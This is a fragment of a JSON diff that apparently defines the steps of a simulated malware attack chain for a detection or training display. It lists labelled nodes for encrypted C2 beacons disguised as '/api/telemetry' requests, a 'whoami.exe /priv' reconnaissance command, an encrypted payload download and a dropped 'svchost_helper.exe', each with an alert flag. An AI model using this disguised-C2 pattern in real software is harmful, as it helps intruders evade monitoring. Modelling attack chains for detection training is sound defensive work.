+    { "name": "RSA.Encrypt() [Key Exchange]", "depth": 2, "alert": true, "minStep": 1 },
+    { "name": "AES-CBC Encrypt [Beacon]", "depth": 2, "alert": true, "minStep": 2 },
+    { "name": "POST /api/telemetry [Encrypted C2]", "depth": 3, "alert": true, "minStep": 3 },
+    { "name": "whoami.exe /priv", "depth": 3, "alert": false, "minStep": 4 },
+    { "name": "POST /api/telemetry/stream [Results]", "depth": 3, "alert": true, "minStep": 4 },
+    { "name": "GET /api/payload [Encrypted Download]", "depth": 2, "alert": true, "minStep": 5 },
+    { "name": "svchost_helper.exe (dropped)", "depth": 3, "alert": true, "minStep": 5 },
+    { "name": "POST /api/rekey [Key Rotation]", "depth": 2, "alert": true, "minStep": 6 }
+  ]
+}
